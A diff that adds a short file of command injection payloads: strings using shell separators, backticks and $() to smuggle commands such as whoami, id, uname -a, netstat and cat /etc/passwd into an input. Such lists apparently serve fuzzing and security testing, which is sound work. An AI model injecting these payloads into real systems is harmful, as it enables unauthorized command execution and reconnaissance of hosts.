@@ -1,0 +1,21 @@
+# Command Injection Pattern Payloads
+; ls -la
+; cat /etc/passwd
+; whoami
+; id
+; pwd
+; uname -a
+| ls -la
+| cat /etc/passwd
+| whoami
+| id
+`whoami`
+`id`
+`cat /etc/passwd`
+$(whoami)
+$(id)
+$(cat /etc/passwd)
+& whoami
+&& whoami
+; netstat -an
+; ping -c 4 127.0.0.1
